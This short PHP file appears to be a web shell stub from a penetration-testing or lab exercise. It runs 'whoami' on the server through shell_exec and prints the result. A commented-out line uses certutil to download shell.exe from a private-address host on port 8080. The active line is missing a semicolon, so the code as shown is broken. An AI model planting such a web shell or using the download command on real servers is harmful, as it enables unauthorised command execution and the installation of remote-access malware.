<?php
#$output = shell_exec('certutil -f -split -urlcache http://192.168.49.118:8080/shell.exe');
$output = shell_exec('whoami')
echo "<pre>$output</pre>";
?>

